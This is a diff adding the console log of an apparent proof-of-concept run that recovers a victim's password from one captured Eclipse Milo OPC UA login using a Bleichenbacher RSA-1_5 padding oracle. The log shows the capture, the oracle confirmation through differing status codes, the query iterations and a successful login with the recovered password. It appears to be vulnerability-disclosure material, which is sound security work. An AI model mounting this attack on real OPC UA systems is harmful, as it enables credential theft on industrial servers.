@@ -1,0 +1,86 @@
+==> Using /Users/abhinavagarwal/.local/share/mise/installs/java/temurin-17.0.19+10/bin/java (openjdk version "17.0.19" 2026-04-21)
+==> Building against org.eclipse.milo:*:1.1.4 ...
+==> Shaded jar: /Users/abhinavagarwal/Documents/work/milo-security-poc/username-token-padding-oracle/poc/target/padding-oracle-poc.jar
+    milo.version=1.1.4  sha256=cd6725ff27b82ba2f3a304f8877c9dce3ee710a5d3ccb14c00576dbe14a3a86d
+==> Working directory: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.ci2Ug1
+==> Generated a random victim password at runtime (not printed; not a source constant; length=20)
+==> [1/5] Starting server ...
+    server port=34892, cert SHA-256=559f722472bb721d6abbb2c991dcecfec318a3842932bb79958cdfa0ea372b11
+==> [2/5] Starting recording relay (dumb pipe -- no protocol parsing) ...
+    relay listening on localhost:59372
+==> [3/5] Running victim through the relay ...
+[main] INFO poc.common.TcpRecordingProxy - Recording relay listening on localhost:59372 -> localhost:34892
+RELAY_LISTENING port=59372
+[main] INFO poc.RelayMain - [relay] listening on localhost:59372 -> localhost:34892 (dumb pipe -- no protocol parsing)
+[main] INFO poc.RelayMain - [relay] recorded 1883 client->server bytes, 3954 server->client bytes (raw, unparsed)
+CAPTURE_WRITTEN c2sFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.ci2Ug1/capture-c2s.raw s2cFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.ci2Ug1/capture-s2c.raw c2sBytes=1883 s2cBytes=3954
+==> Isolation self-check: raw capture files do not contain the victim password (verified by grep)
+==> [4/5] Running attacker (parses the raw capture itself; checkpointed; resumes across attempts) ...
+    --- attacker attempt 1/40 (max-runtime=90s) ---
+[*] Live server certificate SHA-256: 559f722472bb721d6abbb2c991dcecfec318a3842932bb79958cdfa0ea372b11
+[main] INFO poc.AttackerMain - [*] Parsing raw capture ourselves: 1883 client->server bytes from /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T/padding-oracle-poc.ci2Ug1/capture-c2s.raw
+[main] INFO poc.common.WireCodec -   decoded ActivateSessionRequest on wire: policyId=username_rsa15, user=victim, encAlg=http://www.w3.org/2001/04/xmlenc#rsa-1_5, password ct = 256 bytes
+[main] INFO poc.AttackerMain - [*] Extracted the server certificate presented during the captured session from the raw server->client bytes ourselves; SHA-256=559f722472bb721d6abbb2c991dcecfec318a3842932bb79958cdfa0ea372b11
+[*] Extracted from capture: username=victim, policyId=username_rsa15
+[main] INFO poc.AttackerMain - [*] Extracted ciphertext SHA-256: 07c698138c75e40d56bc9614fd964fb24eb27264954cfe24e724ad0f628a7731
+[*] Captured token SHA-256: 07c698138c75e40d56bc9614fd964fb24eb27264954cfe24e724ad0f628a7731
+[+] Basic128Rsa15 username policy found
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Java version: 17.0.19
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Stack version: dev
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Client SDK version: dev
+[main] INFO poc.AttackerMain - oracle-confirm: valid-padding/wrong-password -> 0x801F0000 (StatusCode[name=Bad_UserAccessDenied, value=0x801F0000, quality=bad]); invalid-padding/random -> 0x80130000 (StatusCode[name=Bad_SecurityChecksFailed, value=0x80130000, quality=bad])
+[+] Padding oracle confirmed (valid-padding/wrong-password -> Bad_UserAccessDenied, invalid-padding -> Bad_SecurityChecksFailed)
+[main] INFO poc.common.BleichenbacherEngine - Step 2a: searching first conforming s >= 15067 (pipelined, window=48)
+[main] INFO poc.common.BleichenbacherEngine - Step 2a: first conforming s found after 42480 queries (this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1: 1 interval, width 2^2017 (42480 queries this invocation)
+[main] INFO poc.AttackerMain -   [keepalive] session activity refreshed at 44307 queries
+[main] INFO poc.common.BleichenbacherEngine -   iter 507: 1 interval, width 2^1509 (44481 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 985: 1 interval, width 2^1031 (46481 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1490: 1 interval, width 2^527 (48482 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1986: 1 interval, width 2^31 (50407 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1987: 1 interval, width 2^30 (50411 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1988: 1 interval, width 2^29 (50415 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1989: 1 interval, width 2^27 (50416 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1990: 1 interval, width 2^27 (50419 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1991: 1 interval, width 2^26 (50423 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1992: 1 interval, width 2^24 (50424 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1993: 1 interval, width 2^23 (50426 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1994: 1 interval, width 2^22 (50427 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1995: 1 interval, width 2^22 (50433 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1996: 1 interval, width 2^20 (50436 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1997: 1 interval, width 2^19 (50440 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1998: 1 interval, width 2^18 (50441 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 1999: 1 interval, width 2^18 (50447 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2000: 1 interval, width 2^17 (50453 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2001: 1 interval, width 2^16 (50457 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2002: 1 interval, width 2^15 (50465 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2003: 1 interval, width 2^13 (50472 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2004: 1 interval, width 2^12 (50473 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2005: 1 interval, width 2^11 (50474 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2006: 1 interval, width 2^10 (50476 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2007: 1 interval, width 2^9 (50477 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2008: 1 interval, width 2^9 (50480 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2009: 1 interval, width 2^8 (50484 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2010: 1 interval, width 2^6 (50487 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2011: 1 interval, width 2^5 (50488 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2012: 1 interval, width 2^4 (50492 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2013: 1 interval, width 2^3 (50494 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2014: 1 interval, width 2^2 (50495 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2015: 1 interval, width 2^1 (50497 queries this invocation)
+[main] INFO poc.common.BleichenbacherEngine -   iter 2016: 1 interval, width 2^0 (50498 queries this invocation)
+[main] INFO poc.AttackerMain - ==== RECOVERY COMPLETE: 50498 total oracle queries, 29.5 s total wall-clock ====
+[*] Recovery complete: 50498 queries in 29.5 seconds
+[+] Wrong-password control denied
+[+] Recovered-password authentication succeeded
+==> [5/5] Verifying (only this step ever compares recovered-vs-actual) ...
+[+] VERIFIED: recovered password matches the victim's actual password (PASS)
+VERIFY_RESULT=PASS
+
+Captured one encrypted OPC UA login
+Recovered plaintext password in 50498 requests / 29.5 seconds
+Wrong password: DENIED
+Recovered password: LOGIN SUCCESSFUL
+
+==> Environment: Darwin 24.6.0 arm64, openjdk version "17.0.19" 2026-04-21
+==> Run directory retained at: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.ci2Ug1
+==> exit 0: succeeded
